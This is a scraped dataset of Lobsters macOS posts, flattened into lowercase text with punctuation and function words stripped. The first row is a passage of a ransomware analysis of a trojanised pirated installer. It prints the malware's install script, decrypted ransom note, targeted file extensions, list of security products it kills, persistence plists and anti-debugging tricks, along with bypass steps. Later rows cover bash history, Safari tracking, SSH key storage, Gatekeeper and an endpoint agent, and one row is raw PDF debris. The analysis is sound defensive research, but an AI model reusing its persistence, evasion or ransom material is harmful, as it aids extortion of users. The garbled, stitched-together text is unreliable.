volumesmixed key mounted disk image volumesmixed key contains installer package mixed key l volumesmixed key mixed key favorite tool statically analyzing extracting file package suspicious package opened suspicious package find pirated mixed key application binary named patch clicking postinstall tab find post install script binsh librarymixednkey applicationsutilspatch librarymixednkeytoolroomd applicationutils x librarymixednkeytoolroomd short creating librarymixednkey directory move binary named patch directory set executable launch installer request root privilege install script thus toolroomd binary also run root privilege via dynamic analysis monitoring tool file process monitor passively observe installation process procinfo process start pid path binsh user args binsh usersuserdownloadsmixed key application fsusage w f filesystem mkdir librarymixednkey rename applicationsutilspatch librarymixednkeytoolroomd using suspicious package extract mixed key application binary named patch mixed key binary still validly signed mixed key developer likely pristine unmodified turn attention toolroomd binary toolroomd binary originally called patch unsigned macho executable file patch patch macho executable codesign dvv patch patch code object signed shasum patch patch next run string command string patch systemprivilegeadmin reroot silent noroot ignrp generatexkey toidievitceffelibtpyrctpyrcc bit getprocesslist toidievitceffelibpersistpersistc return tab del esc rightcmd leftcmd leftshift cap leftoption string output find obfuscated string plus appear related command line argument file encryption perhaps keylogging via nm utility dump name symbol including function name nm patch u cgeventgetintegervaluefield u cgeventtapcreate u cgeventtapenable u nsaddressofsymbol u nscreateobjectfileimagefrommemory u nsdestroyobjectfileimage u nslinkmodule u nslookupsymbolinmodule u nsunlinkmodule u nxfindbestfatarch constructplistpath dispatch eirootgainerelevate generatexkey gethostidentifier getprocesslist homestub istarget maketempname mhexecuteheader packtrailer reactexec reacthost reactkeys reactping reactsave reactscmd reactstart rotate tpdecrypt tpencrypt unpacktrailer acquireroot u connect createrescueexecutable eicarvermain eiforensicsendfile eiforensicthread eigethostinfo eigetmacaddr eiloadermain eiloaderthread eipersthread eipersistencemain eireadspot eirootgainermain eirunfile eirunmemoryhrd eirunthread eisavespot eiselfretainmain eibdecode eibencode eibpackc eibsecuredecode eibsecureencode eibstringfa eibstringkey eibunpacki eipdecrypt eipencrypt eipkey eipseeds isdebugging isvirtualmchn lfscdirlist lfscgetcontents lfscmatch lfscpackbinary lfscparsetemplate lfscunpackbinary persistexecutable persistexecutablefrombundle u popen preventtrace ohh plot thickens nm output seen method function name related keylogging cgeventtapcreate cgeventtapenable etc inmemory code execution nscreateobjectfileimagefrommemory nslinkmodule etc antianalysis isdebugging isvirtualmchn survey gethostidentifier getprocesslist etc persistence persistexecutable persistexecutablefrombundle encryption ransom eipencrypt simple piece ransomware time disassembledebug patch binary core logic patch toolroomd binary occurs within main function first par commandline parameter looking silent noroot ignrp silent silent passed via command line set value zero appears instruct malware run silently example suppressing printing error message cmp rbpsilent jnz skiperrmsg lea rdi application run root call printf flag passed eirootgainermain function influence malware running normal user may request root privilege lea rdx rbpsilent lea rcx call eirootgainermain interestingly flag explicitly initialized zero set zero silent specified though appears never set thus malware alway run silent mode even silent specified noroot noroot passed via command line set value one various code within malware check flag set take different action example skipping request root privilege cmp rbpnoroot jnz norequestforroot call eirootgainermain flag also passed persistence function influence malware persisted launch daemon launch agent mov ecx rbpnoroot mov call eipersistencemain ignrp ignrp passed via command line set value one instructs malware persist ignore persistence example eiselfretainmain function persists malware flag checked set function simply return without persisting malware cmp rbpignorepersistence jz leave malware parse command line option executes function named isvirtualmchn exit return true isvirtualmchn exit let take closer look function want make sure detect debugging session virtual machine isvirtualmchn int time sleep argo rax time rdx rax rdx rax rdx return rax code invokes time twice sleep compare difference two call time match amount time system slept detect sandbox patch speedup call sleep sleep patching sandbox patch sleep function try outmaneuver malware us time delay response malware check see time accelerated malware get timestamp go sleep get timestamp wake time difference timestamps duration amount time malware programmed sleep malware know running environment patching sleep function would happen sandbox wwwisacaorg mean reality function sandbox check may detect virtual machine good news debugging effort continuing malware invokes method named extractei attempt read byte trailer data within end however function named unpacktrailer invoked extractei return false check fails appears sample contain required trailer data rcx trailer data cmp dword ptr mov rax jz leave trailer data found sample skip certain persistence logic appears persist daemon rcx trailer data extractei persistexecutablefrombundle installdaemon eistr lbx eistr eistr eistr eistr rundaemonu runtarget appears various value interest u namepath daemon obfuscated however look like eistr function responsible deobfuscation looking decompilation see onetime initialization variable named eibstringkey call function named eibsecuredecode call method named tpdcrypt eistr int eibstringkey eibstringkey eipdecrypt eibstringfa rax strlen rax eibsecuredecode rax eibstringkey rax else rax return rax generally concern detail deobfuscation decryption algorithm simply set debugger breakpoint end function print plaintext string held rax register let least dump decryption key eibstringkey lldb x rdx however downside approach decrypt string malware invokes eistr function debugger breakpoint hit thus encrypted string referenced block code executed ever see decrypted value course want decrypt string know malware obviously decrypt string via eistr function need way convince turn hard simply create injectable dynamic library resolve address malware eistr function invokes anyall encrypted string place logic constructor dynamic library automatically executed library loaded malware code even run wellcommented code injectable dynamic library constructor static void decrypt define resolve malware eistr function typedef char eistr char str eistr eistrfp dlsym rtldmainonly eistr init pointer cstring segment start eistr long char start char eistrfp char end start char current start decrypt sting current end decrypt char string eistrfp current printf decrypted string lx sn unsigned long current string next current strlen current short simply scan entire cstring segment contains encrypted string invoking eistr method encrypted string compile forcefully load malware via dyldinsertlibraries environment variable loaded decryption logic invokes coerces malware decrypt string dyldinsertlibrariestmplibevilquestdecryptordylib librarymixednkeytoolroomd decrypted string decrypted string rettxt decrypted string osascript e beep say waiting completion false set altitle set altext display alert altext message altitle critical button ok set clipboard decrypted string readmenowtxt decrypted string sdesktop decrypted string sdocuments decrypted string spictures decrypted string smovies decrypted string shellperapp decrypted string osascript e shell script sudo administrator privilege decrypted string systemprivilegeadmin decrypted string reroot decrypted string launchctl submit l questd p decrypted string silent decrypted string osascript e shell script launchctl load w launchctl start administrator privilege decrypted string osascript e shell script launchctl load w launchctl start decrypted string idrsa decrypted string pemi decrypted string ppki decrypted string knownhostsi decrypted string cabundlei decrypted string crti decrypted string decrypted string eri decrypted string pfxi decrypted string decrypted string key pdfi decrypted string wallet pdfi decrypted string key pngi decrypted string wallet pngi decrypted string key jpgi decrypted string wallet jpgi decrypted string key jpegi decrypted string wallet jpegi decrypted string hellocruelworld decrypted string memory based bundle decrypted string eirunmemoryhrd decrypted string doctype plist public appledtd plist http plist version dict key label key string string key programarguments key array string sudo string string string string silent string array key runatload key true key keepalive key true dict plist decrypted string wb decrypted string slibrary decrypted string libraryappquestcomapplequestd decrypted string libraryappquest decrypted string slibraryappquest decrypted string slibraryappquestcomapplequestd decrypted string doctype plist public appledtd plist http plist version dict key label key string string key programarguments key array string string string silent string array key runatload key true key keepalive key true dict plist decrypted string questd decrypted string comapplequestdplist decrypted string librarylaunchdaemons decrypted string slibrarylaunchagents decrypted string decrypted string decrypted string q h decrypted string xookc decrypted string osascript e shell script sudo open administrator privilege decrypted string hi decrypted string shcsh decrypted string little snitch decrypted string kaspersky decrypted string norton decrypted string avast decrypted string drweb decrypted string mcaffee decrypted string bitdefender decrypted string bullguard decrypted string comapplequestd decrypted string ookcucythguan decrypted string installerapp decrypted string setup decrypted string ignrp decrypted string user decrypted string noroot decrypted string ignrp decrypted string sncspot decrypted string decrypted string important file encrypted many document photo video image file longer accessible encrypted maybe busy looking way recover file waste time nobody recover file without decryption service use aes algorithm take billion year break encryption without knowing key read wikipedia aes nt believe statement anyways guarantee recover file safely easily require u use processing power electricity storage side fixed processing fee usd onetime payment additional fee included order accept offer deposit payment within hour day receiving message otherwise offer expire lose file forever payment deposited bitcoin based bitcoinusd exchange rate moment payment address make payment decryption start automatically within hour payment processed take hour depending processing power computer file restored offer valid hour receiving message decrypted string decrypted string file encrypted decrypted string many important document photo video image file longer accessible encrypted maybe busy looking way recover file waste time nobody recover file without decryption service guarantee however recover file safely easily cost usd without additional fee offer valid day starting full detail found file readmenowtxt located desktop decrypted string readmenow decrypted string tar decrypted string rar decrypted string tgz decrypted string zip decrypted string decrypted string dmg decrypted string gz decrypted string jpg decrypted string jpeg decrypted string png decrypted string gif decrypted string psd decrypted string eps decrypted string decrypted string decrypted string mov decrypted string avi decrypted string mkv decrypted string wav decrypted string aif decrypted string aiff decrypted string ogg decrypted string flac decrypted string doc decrypted string txt decrypted string docx decrypted string xl decrypted string xlsx decrypted string page decrypted string pdf decrypted string rtf decrypted string decrypted string csv decrypted string djvu decrypted string epub decrypted string pub decrypted string key decrypted string dwg decrypted string c decrypted string cpp decrypted string h decrypted string decrypted string php decrypted string cgi decrypted string cs decrypted string sc decrypted string sas decrypted string otf decrypted string ttf decrypted string asc decrypted string c decrypted string vb decrypted string asp decrypted string ppk decrypted string crt decrypted string decrypted string pfx decrypted string decrypted string dat decrypted string hpp decrypted string ovpn decrypted string download decrypted string pem decrypted string number decrypted string keynote decrypted string ppt decrypted string aspx decrypted string html decrypted string xml decrypted string json decrypted string j decrypted string sqlite decrypted string pptx decrypted string pkg decrypted output find many revealing string appear address command control server regexes file interest relating key certificate wallet idrsa key pdfi wallet pdf property list file launch item persistence security product little snitch kaspersky de ransom instruction target file extension continuing analysis specimen appear contain trailer data code block mentioned skipped malware invokes function named eipersistencemain also persists malware however persistence eipersistencemain function invokes various antidebugging logic attempt thwart dynamic debugging specifically first call function named isdebugging isdebugging method implemented address check debugged invokes sysctl ctlkern kernproc kernprocpid getpid returned check ptraced set infokppro structure returned sysctl common antidebugger check seen macos malware isdebugging function return true malware exit call isdebugging cmp eax jz continue mov edi call exit subvert debugger simply set breakpoint change value rax register false thread queue comapplemainthread stop reason breakpoint cmpl eax je movl edi callq target patch stopped lldb reg read rax rax lldb reg write rax lldb c good almost malware contains antidebugging logic function called preventtrace seek prevent tracing debugging via call ptrace ptracedenyattach flag preventtrace proc near push rbp mov rbp rsp call getpid xor ecx ecx mov edx ecx addr xor ecx ecx data mov edi request mov esi eax pid call ptrace pop rbp retn preventtrace endp bypass simply avoid call preventtrace together however simply set breakpoint call function modify value instruction pointer rip skip lldb b breakpoint patch patch address lldb c process resuming process stopped thread queue comapplemainthread stop reason breakpoint callq leaq rip rdi movl esi movl eax rbp target patch stopped lldb reg write rip lldb c easy peasy continue dynamic analysis unperturbed name suggests eipersistencemain function persists malware launch agent however persisting invokes function named killunwanted kill several well known security product may detect block malicious behavior killunwanted function get list running process compare process encrypted list unwanted program aforementioned breakpoint eistr function dump decrypted string ascertain value unwanted program lldb x rax little snitch lldb x rax kaspersky lldb x rax norton lldb x rax avast lldb x rax drweb lldb x rax mcaffee lldb x rax bitdefender lldb x rax bullguard day objectivesee tool make list ha finally eipersistencemain function persists malware specifically first call persistexecutable function creates persistent copy observe via file monitor andor debugger first observe malware decrypting various string related persistence lldb x rax libraryappquestcomapplequestd lldb x rax slibraryappquestcomapplequestd malware running nonroot privilege write copy libraryappquestcomapplequestd however running root also copy libraryappquestcomapplequestd observed via file monitor macos fsusage utility see nonroot instance malware creating libraryappquestcomapplequestd ensuring executable via chmod fsusage w f filesystem open libraryappquestcomapplequestd write close chmod libraryappquestcomapplequestd open libraryappquestcomapplequestd write close chmod libraryappquestcomapplequestd libraryappquestcomapplequestd libraryappquestcomapplequestd libraryappquestcomapplequestd usersuserlibraryappquestcomapplequestd malware copied persists via launch item code performs persistence found installdaemon function address invoked via eipersistencemain function running nonroot persists launch agent librarylaunchagentscomapplequestdplist dump argument passed installdaemon malware installing launch agent lldb librarymixednkeytoolroomd thread stop reason breakpoint frame toolroomd pushq rbp movq rsp rbp subq rsp movq rdi rbp target toolroomd stopped lldb x rdi usersuser lldb x rsi slibraryappquestcomapplequestd lldb x rdx slibrarylaunchagents us argument build path launch item launch agent property list usersuserlibrarylaunchagentscomapplequestdplist well configuring said plist continuing debugging session observes malware decrypted embedded template plist populated path persistent binary eg usersuserlibraryappquestcomapplequestd x rax xml version encoding n doctype plist public appledtd plist http n plist version n dict n key label key n string string nn key programarguments key n array n string string n string silent string n array nn key runatload key n true nn key keepalive key n true nn dict n plist launch agent property list fully configured memory malware writes disk cat usersuserlibrarylaunchagentscomapplequestdplist xml version encoding doctype plist public appledtd plist http plist version dict key label key string questd string key programarguments key array string usersuserlibraryappquestcomapplequestd string string silent string array key runatload key true key keepalive key true dict runatload key set true malware comapplequestd automatically restarted time user log course blockblock detects persistence attempt malware running root privilege invoke installdaemon function time passing argument specifying launch daemon created cat librarylaunchdaemonscomapplequestdplist xml version encoding doctype plist public appledtd plist http plist version dict key label key string questd string key programarguments key array string sudo string string libraryappquestcomapplequestd string string silent string array key runatload key true key keepalive key true dict malware ensured persisted twice running root invokes eiselfretainmain start launch item function invokes aptly named rundaemon turn invokes macos osascript binary launch item observe via process monitor example malware start launch daemon procinfo process start pid path usrbinosascript user args osascript e shell script launchctl load w librarylaunchdaemonscomapplequestdplist launchctl start questd administrator privilege malware persisted kicked launch item invokes function named createrescueexecutable create yet another copy copy made user library directory named start show ui ie finderapp followed via random character example malware also appends trailer data copy content file also save global variable named privrescuedata allows malware rescue deleted disk yet still running memory looking crossreferences variable reveal later reference function resquemyself persistexecutable malware want removed infected system via process monitor observe malware kicking configured copy via launchctl submit l command procinfo process start pid path binlaunchctl user args launchctl submit l questd p procinfo process start pid path user â malware persisted launched configured ie trailer data instance appear actually lot pop part two read conclusion today triaged interesting piece new malware detailing infection vector persistence antianalysis logic though new free tool blockblock ransomwhere able detect thwart various aspect attack priori knowledge iocs librarymixednkeytoolroomd libraryappquestcomapplequestd libraryappquestcomapplequestd librarylaunchdaemonscomapplequestdplist librarylaunchagentscomapplequestdplist note though infected due malware viral infection capability recommended one wipe infected system fully reinstalls macos love blog post andor want support research tool support via patreon page
22,Lobsters,mac,Apple macOS,Supercharge Your Bash History,http://metaredux.com/posts/2020/07/07/supercharge-your-bash-history.html,supercharge bash history,,weird reason decided abandon insane zshell setup switch vanilla bash guess needed bit simplicity life one thing initial bash experience drove nut way handle history outofthebox shell session history terminate session history dumped bashhistory overwriting whatever past pretty much kill value persistent shell history note exit cleanly history lost corollary really share history different shell session shell load history file startup augments whatever command executed loading file ran build command shell easily recall shell b keep duplicated entry history default store many history entry last command obviously right way shell history consider right optimal depends exactly using shell know many people hate sharing data shell session want keep isolated various reason hand know single person like shell history constantly overwritten let teach bash append history file instead overwriting add following bashrc append history file nt overwrite shopt histappend note linux distros eg ubuntu might enabling shell option default bashrc copy user home folder let increase history size teach bash ignore duplicate entry history nt put duplicate line line starting space history see bash option histcontrolignoreboth setting history length see histsize histfilesize bash obviously go really big unless fast ssd would recommend reading history add bit latency new shell session moving crux let teach bash update history command invoke reload reloading ensures different shell session synced term history append reload history command promptcommand history history n history writes history file history n reloads history file twist load new entry added make way efficient another similar quite popular approach namely using history history c history r full reloads huge history file would exhibit slight delay command run solution suggested largely avoid might also want remove use certain command history whether privacy readability reason done histignore variable common use exclude l similar call job control builtins like bg fg call history histignorels cd pwd bg fg history feel free add command want store history note specifying exact match exclusion config would exclude l exclude l project time using command invoked without argument putting together magic recipe supercharge bash history place bashrc nt put duplicate line line starting space history see bash option histcontrolignoreboth append history file nt overwrite shopt histappend append reload history command promptcommand history history n ignore certain command history histignore l cd pwd bg fg history setting history length see histsize histfilesize bash today keep hacking
23,Lobsters,mac,Apple macOS,"An iOS, iPadOS, and macOS application reference manual for ARM assembly instructions",https://github.com/evilpenguin/ARMRef,io ipados macos application reference manual arm assembly instruction,join github today sign file permalink topic resource license reload reload,arm assembly reference manual io ipados macos dismiss join github today github home million developer working together host review code manage project build software together sign file permalink failed load latest commit information type name latest commit message commit time arm assembly reference manual io ipados macos topic resource license perform action time signed another tab window reload refresh session signed another tab window reload refresh session
24,Lobsters,mac,Apple macOS,No - Safari 14 Does Not Block Google Analytics,https://www.simoahava.com/analytics/no-safari-does-not-block-google-analytics/,safari block google analytics,safari block google analytics loading running website worldwide developer conference version privacy report crosssite tracker tracker prevented apple insider search engine journal myth debunked safari block resource load intelligent tracking prevention maciek stanasiuk tom anthony block prevents tracker cooky crosssite request thirdparty cooky privacy report work privacy report duckduckgo known google analytics firstparty analytics platform set final thought block prevent tracker devastating impact limit,let start proclaiming clarity sincerity safari version safari block google analytics loading running website midst apple yearly worldwide developer conference company showcased privacy improvement upcoming version safari web browser version fact biggest revelation new privacy report designed elucidate much browser working towards mitigating damage caused crosssite tracker better worse one preview showed googleanalyticscom listed among tracker prevented website queue panic spread misinformation like wildfire dry brush firstparty analytics apple insider quick report going far say browser completely block google search engine journal picked story saying specifically show google analytics blocked safari note search engine journal added footnote might got story wrong myth debunked safari block resource load intelligent tracking prevention itp work elegant john wilander webkit engineer charge itp saying itp started block resource load itp much block cooky early maciek stanasiuk tested whether hit actually blocked found opposite similarly tom anthony contributed research safari say block prevents tracker mean itp algorithm flagged domain crosssite tracking capability safari among thing stripped capability carry cooky crosssite request also known thirdparty cooky safari mean prevented known tracker googleanalyticscom domain flagged crosssite tracking domain safari assigns certain protective measure communication domain read prove point site googleanalyticscom googletagmanagercom flagged tracking domain still merrily loading javascript library sending http request designated endpoint privacy report work intelligent tracking prevention flag domain potential tracking domain detects request sent browser sufficient number unique domain safari browser sends request googleanalyticscom safari flag googleanalyticscom crosssite tracking capability itp hundred upon hundred domain regular safari user since introduction safari slowly close noose around crosssite tracker privacy report designed shed light process however instead listing domain flagged itp domain crossreferenced duckduckgo tracker list match found domain surfaced privacy report showcase itp blocking known tracker reading data really fact googleanalyticscom ability leverage thirdparty storage neutered mean nothing tool actually used google analytics firstparty analytics platform downloaded google server javascript library identifier stored firstparty cooky http request ga endpoint use identifier identifier alone specify source tracker thirdparty storage access used request googleanalyticscom mean might cooky set googleanalyticscom would imagine used debugging monitoring purpose example cooky would work safari browser target googleanalyticscom tracking domain final thought disappointed many thing right disappointed bit misinformation spread fast reputable journal took grainy screenshot couple influencer tweet jumped conclusion quoted social medium disappointed privacy report clumsy wording use term like block prevent tracker lead confusion aftermath wwdc showed unless clearly defined report know final version privacy report yet hopefully copy clarified disappointed took whole day install big sur macos beta external drive test something already knew true yes disappointed enough disk space available install big sur proper hard disk partition disappointed privacy report intelligent tracking prevention amazing job protecting safari user something devastating impact mishandled itp keep evolving morphing adjust crosssite tracking crowd google analytics user need worry safari google analytics require crosssite tracking capability safari block use naturally limit effective another story huge thanks folk like maciec stanasiuk tom anthony charles farina working rumor mill
25,Lobsters,mac,Apple macOS,Store SSH keys in the Secure Enclave (macOS),https://github.com/maxgoedjen/secretive,store ssh key secure enclave macos,secretive sekey project safer storage access control notification support smart card getting started installation direct download release page using homebrew faq faq auditable build process note around code signing keychains backup transfer new machine security maxgoedjen gmailcom,secretive secretive app storing managing ssh key secure enclave inspired sekey project rewritten swift external dependency handy native management app safer storage common setup ssh key keeping disk guarded proper permission fine case super hard malicious user malware copy private key store key secure enclave impossible export design access control mac secure enclave also support strong access control like touch id authentication apple watch configure key require touch id watch authentication accessed notification secretive also notifies whenever key accessed never caught guard support smart card mac without secure enclave configure smart card yubikey use signing well getting started installation direct download download latest release release page using homebrew brew cask install secretive faq faq auditable build process build produced github action auditable build release generation process build document shas step output sha checksum build produced github action verify source code given build corresponds given release note around code signing keychains secretive us secure enclave key storage still relies keychain apis access keychain restricts read key app specifically bundle id created build secretive source make sure consistent bundle id use keychain able locate key backup transfer new machine secret secure enclave exportable able backed able transfer new machine get new mac create new set secret specific mac security discover vulnerability project please notify maxgoedjen gmailcom subject containing secretive security
26,Lobsters,mac,Apple macOS,Before the law sits a Gatekeeper,https://tombrow.com/before-the-law-gatekeeper,law sits gatekeeper,law ca nt right click btl cyjrc btl cyjrc btl,law franz kafka law sits gatekeeper gatekeeper come man country asks gain entry law gatekeeper say grant entry moment man think asks allowed come later possible say gatekeeper ca nt right click jeff johnson apple added gatekeeper mac o x macos try run mac software downloaded internet gatekeeper check whether software signed valid developer id certificate gatekeeper refuse run software people claim mac user right click run unsigned software mean exactly let look user experience series screenshots btl man country expected difficulty law always accessible everyone think look closely gatekeeper fur coat large pointed nose long thin black tartar beard decides would better wait get permission go inside cyjrc user would scared away rightfully apple specifically deliberately warning malware exposing right mind would ignore warning nt already know safe ignore btl sits day year man equipped many thing journey spends everything matter valuable win gatekeeper latter take say taking think failed anything cyjrc every mac developer know sign developer id ship signed notarized apps would financial suicide otherwise business perspective avoiding gatekeeper however mac apple silicon run adhoc signed software nt require certificate according man page codesign commandline tool adhoc signing use identity identifies exactly one instance code significant restriction apply use adhoc signed code consult documentation using btl everyone strives law say man many year one except requested entry gatekeeper see man already dying order reach diminishing sense hearing shout one else gain entry since entrance assigned going close
27,Lobsters,mac,Apple macOS,Can't you just right click?,https://lapcatsoftware.com/articles/unsigned.html,ca nt right click,ca nt right click addendum august michael tsai addendum august hacker news,ca nt right click apple added gatekeeper mac o x macos try run mac software downloaded internet gatekeeper check whether software signed valid developer id certificate gatekeeper refuse run software year gatekeeper become strict recently adding notarization requirement macos catalina gatekeeper check whether software signed valid developer id certificate also phone home check whether apple notarized software refusing run check fails mac developer must sign apple developer program sign legal agreement pay annual fee usd plus tax order obtain developer id code signing certificate upload software apple notarization distribute mac software internet without signing thereby avoiding developer id notarization entirely technically currently yes although apple indicated future version macos may allow unsigned code run people claim mac user right click run unsigned software mean exactly let look user experience series screenshots illustration created unsigned application mygreatapp uploaded server downloaded app safari macos latest public version mac operating system experience essentially beta version macos big sur except new io style alert look even worse see try open app normally double click finder alert mention possibility malware default action move trash good start notice mention right clicking user happens notice click question mark button smallest user interface element window help window open help document helpfully mention malware title mention right clicking last sentence document link another document open app overriding security setting finally see instruction right click err control click control click app finder see contextual menu select open contextual menu another warning scary message mentioning malware loss privacy move trash default option click open button though work advertised right click run unsigned mac software pro mac user already know expect procedure difficult mac user never seen odds make end near zero user would scared away rightfully apple specifically deliberately warning malware exposing right mind would ignore warning nt already know safe ignore mac developer nearly impossible run viable software business firstrun experience new customer never get new customer every mac developer know sign developer id ship signed notarized apps would financial suicide otherwise technically option right click practically viable distribution option mac developer business perspective avoiding gatekeeper addendum august thanks michael tsai pointing new mac apple silicon stricter requirement software signing still run unsigned software compiled intel processor run unsigned software compiled apple silicon processor however run adhoc signed software nt require certificate according man page codesign commandline tool identity single letter dash adhoc signing performed adhoc signing use identity identifies exactly one instance code significant restriction apply use adhoc signed code consult documentation using adhoc sign app xcode nt test adhoc signing nt realize would difference adhoc signing specifically designed running software locally word mac someone else mac far know intended software distribution gatekeeper alert adhoc signed app actually bit pleasant albeit confusing notice longer move trash button progress however alert claim software need updated inaccurate open contextual menu select open see alert able open app although process still quite confusing novice given choice distributing unsigned app adhoc signed app probably ship adhoc signed app alert seem little le scary nonetheless either case likely lose new potential customer first step also noted tested adhoc signing intel mac running catalina nt apple silicon developer transition kit testing addendum august read useful comment hacker news nt see mentioned article get every time rightclick trick work second time try launch app first time rightclick macos wo nt let launch app testing catalina comment correct first right click app display first alert screenshots open button second right click display second alert screenshots open button also note holding option key contextual menu make difference although seem recall made difference earlier version macos
28,Lobsters,mac,Apple macOS,"The XCSSET Malware: Inserts Malicious Code Into Xcode Projects, Performs UXSS Backdoor Planting in Safari, and Leverages Two Zero-day Exploits",https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf,xcsset malware insert malicious code xcode project performs uxss backdoor planting safari leverage two zeroday exploit,,obj metadata rviewerpreferences r endobj obj endobj obj extgstate font procset pdftextimagebimagecimagei mediabox content rgroup tabssstructparents endobj obj stream
29,Lobsters,mac,Apple macOS,Sinter: New user-mode security enforcement for macOS,https://blog.trailofbits.com/2020/08/12/sinter-new-user-mode-security-enforcement-for-macos/,sinter new usermode security enforcement macos,simple opensource swift sinter endpointsecurity api installer beta version example rule kind event quest usermode security agent macos big sur endpointsecurity api endpointsecurity kauth kpi openbsm audit quickly event monitoring process monitor google santa promise better memory safety performance objectivec developing sinter faint heart making decision realtime without impacting system mitigating toctou risk realtime security decision toctou issue raised toctou santa openradar macos executable file live application bundle attempt bundle file integrity monitoring capability advantage installing agent system extension system extension driverkit network extension system integrity protection mastering entitlement signing notarization workflow special entitlement cmakedriven approach ci stay tuned upshot get involved sinter available today contact u get started github empire hacking slack like,tl dr sinter first available opensource endpoint protection agent written entirely swift support apple new endpointsecurity api first principle sinter demonstrates build successful eventauthorization security agent incorporates solution many challenge endpoint protection agent face migrate kernelmode usermode agent release macos big sur simple opensource swift sinter new opensource endpoint security enforcement agent macos written swift built scratch usermode agent leveraging new endpointsecurity api receive authorization callback macos kernel set securityrelevant event type sinter controlled simple rule allow deny us none expensive fullsystem scan signaturebased detection traditional antivirus solution grab installer beta version today try currently sinter let write set rule block allow process execution event provide rule agent santacompatible sync server local configuration file example rule demonstrates explicitallow however planning develop sophisticated rule syntax add blocking capability many kind event supported api would also mean end santa rule compatibility quest usermode security agent implementing endpoint security solution eg antivirus antimalware requires interception authorization oslevel event real time historically meant use kernelmode callback apis hooking kernelmode operating system code proper api provided operating system developer long known thirdparty kernelmode code like leading source system instability insecurity small error kernel code tends large consequence enter macos endpointsecurity api late apple announced support thirdparty kernel extension would deprecated macos would introduce usermode apis framework replace functionality needed thirdparty product security vendor put notice deprecate existing kernelmode solution within next year migrate endpointsecurity api next release macos macos big sur clearly fun prospect many team soon announcement client tapped u develop usermode solution would make migration le painful endpointsecurity api endpointsecurity api implement callback macos kernel real time particular event happen endpointsecurity client subscribe one event type either notify type auth authorization type notify sound like useful capturing simple activity log host authorization callback much powerful let client process make decision allow deny event happening endpointsecurity replaces kernelmode equivalent realtime event authorizing macos kauth kpi unsupported kernel method readonly event monitoring openbsm audit trail realtime monitoring protection product macos must rewritten use endpointsecurity macos big sur note networkrelated event endpointsecurity api except unix domain socket network extension framework combine use apis one system extension focus endpointsecurity api specifically using api stephen davis fireeye patrick wardle objectivesee quickly released event monitoring application could display example processrelated filerelated event real time readonly monitoring tool following footstep process monitor procmon useful using notify half functionality endpointsecurity api ability monitor google santa opensource macos process allowdeny solution objectivec demonstrates ability authorize event using endpointsecurity agent receives make allowdeny decision process event endpointsecurity saw would critically important master endpointsecurity api many team would need migrate existing macos security application development sinter delved endpointsecurity learned lesson experience incorporated solution various challenge sinter also demonstrates implementation endpointsecurity client swift programming language promise better memory safety performance objectivec maintaining compatibility new macos apis developing sinter faint heart implementing eventauthorizing agent order magnitude difficult implementing readonly eventsubscriber also hard shortcoming endpointsecurity api significant heavy lifting course sinter development making decision realtime without impacting system possibly difficult part implementing security event authorization agent authorization decision must made real time block forever make decision endpointsecurity enforces deadline authorization message client blow deadline endpointsecurity terminate client process preserve functioning system decision made synchronously sinter us escopymessage dequeue message endpointsecurity allow dispatcher immediately send next message decision made separate thread responding asynchronously soon possible one decision take longer others process often apis needed perform signature check interrupted sinter ran problem headon quick burst execution event involving large program caused sinter lock machine solved implementing efficient queuing system one queue small program another one big program event would never get stuck waiting queue bigprograms queue work outofprocess longrunning verification aborted whenever necessary new approach performs reliably test mitigating toctou risk realtime security decision toctou time check time use race condition vulnerability pattern commonly occurs making security decision security agent performing check must allow checked resource modified time check action approval authorizing macos execution event resource checked executable file mapped memory executing one toctou attack scenario malicious actor executes badapp bad executables mapped memory execution authorization event emitted endpointsecurity attacker immediately replaces modifies executable file make goodapp endpointsecurity client get event verifies bundle file look good allows execution problem unique endpointsecurity always risk kauth framework preceded eg issue raised toctou santa long ago still challenge must solved agent want authorize event mentioned sinter attempt monitor file event catch toctou attack would much easier apple handled responsibility within endpointsecurity api submitted apple developer feedback suggestion see openradar macos executable file live application bundle execution event occur context single executable file macos executables exist within application bundle directorylike structure appears single app file macos finder bundle codesigned codesigning verification must done bundle level mean security agent catch execution event must discover executable containing app bundle verify code signature entire task performed endpointsecurity bundle like apple xcodeapp upwards gigabyte size processing verification real time possible execution event denied first verification completes endpointsecurity provide builtin caching mechanism single cache shared endpointsecurity client however client invalidate single entry cache clear entire cache endpointsecurity automatically invalidate cache item related file changeddeletedetc perfile basis perapplicationbundle currently sinter work two cache one managed endpointsecurity another custom cache containing application bundle codesigning verification result theory malware could added application bundle endpointsecurity would react clearing cached approval decision previously approved executable file bundle changed endpointsecurity client would monitor invalidate entire cache response le ideal hope apple make improvement caching mechanism near term endpointsecurity client may implement integrity monitoring application bundle avoid circumvented way sinter attempt bundle file integrity monitoring capability detect custom cache cleared advantage installing agent system extension system extension apple name usermode component extend system umbrella term replaces nowdeprecated thirdparty kernel extension endpointsecurity one api umbrella driverkit network extension couple others system extension also new kind managed plugin package macos install executable installing endpointsecurity client system extension implement endpointsecurity functionality kind executable even basic commandline highly encouraged additional benefit systemenforced protection agent installed system extension system extension opt loaded thirdparty application startup apple also announced macos extends sip system integrity protection cover system extension meaning prevents even root user unloading security agent historically possible developed kernelmode antitamper logic installing agent system extension free reinventing wheel sinter currently background daemon apple documented antitamper protection benefit installing agent system extension converting sinter format mastering entitlement signing notarization workflow endpointsecurity api usable within codesigned notarized application appleapproved developer like trail bit word api gated special entitlement unlike entitlement one requires manual application approval apple granted codesigning certificate endpointsecurity entitlement case time approved six calendar week mileage may vary apple apparently careful entitlement misbehaving malicious endpointsecurity client could put halt everything host system apple codesigning notarization step difficult troubleshoot fail essential set automate process early immediately notice break easily narrow breaking change sinter created cmakedriven approach automates workflow apple notarization packaging package signing package notarization step integrates perfectly ci minimal fuss one last entitlement endpointsecurity agent need related user privacy agent inspecting file whether context file event executables process event need user permission access filesystem first run application user must manually go privacy setting system preference enable full disk access mdm payload automatically enable permission sidestep manual user approval step thornier challenge addressed writing sinter course miscellaneous gotchas lesson learned eg determining whether file binary signature verification multiple endpointsecurity client update compelling detail development tuned upshot deprecation kernel extension apple leveling playing field endpoint protection agent everyone must use usermode apis benefit everyone improved system stability reduced attack surface existing security product developer first replace kernel extension usermode approach user mode work language cc instead starting scratch example code c hope organization help u build rely upon opensource platform swift forwardlooking choice longterm investment apple successor objectivec get involved sinter beta version sinter available today significant first step peek larger item working invite partner u sponsor continued development sinter discus integration endpointsecuritybased capability existing contact u get started contributor welcome give u feedback github join u sinter channel empire hacking slack like like loading
